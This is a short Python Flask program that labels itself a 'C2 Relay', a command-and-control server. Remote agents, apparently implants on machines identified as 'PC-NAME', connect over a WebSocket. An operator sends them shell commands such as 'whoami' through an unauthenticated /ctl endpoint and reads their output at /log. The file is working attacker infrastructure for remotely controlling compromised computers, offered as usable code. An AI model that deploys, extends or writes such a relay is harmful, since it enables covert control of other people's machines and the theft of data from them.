#!/usr/bin/env python
"""C2 Relay — WebSocket tunnel for real-time agent control"""
import os, json, threading
from flask import Flask, Response, request
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)
agents = {}  # id -> ws
pending = {}  # id -> command queue
results = []  # last N results

@app.route("/")
def index():
    return Response("C2 Relay — online\n/ws — agent WebSocket\n/ctl — send commands\n/log — view results",
                    mimetype="text/plain")

@sock.route("/ws")
def agent_ws(ws):
    agent_id = "unknown"
    try:
        while True:
            msg = json.loads(ws.receive())
            agent_id = msg.get("id", agent_id)
            agents[agent_id] = ws

            if msg.get("type") == "result":
                results.append({"id": agent_id, "output": msg.get("output", "")[:2000]})
                if len(results) > 50:
                    results.pop(0)

            if agent_id in pending:
                cmd = pending.pop(agent_id)
                ws.send(json.dumps({"cmd": cmd}))
    except Exception:
        pass
    finally:
        agents.pop(agent_id, None)

@app.route("/ctl", methods=["POST"])
def ctl():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get("id", "")
    cmd = data.get("cmd", "")

    if not cmd:
        return Response("usage: POST {id: 'PC-NAME', cmd: 'whoami'}", status=400)

    if agent_id in agents:
        agents[agent_id].send(json.dumps({"cmd": cmd}))
        return Response(f"sent to {agent_id}", status=200)
    else:
        pending[agent_id] = cmd
        return Response(f"queued for {agent_id}", status=202)

@app.route("/log")
def log():
    return Response("\n\n".join(
        f"[{r['id']}] {r['output']}" for r in results[-30:]
    ), mimetype="text/plain")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
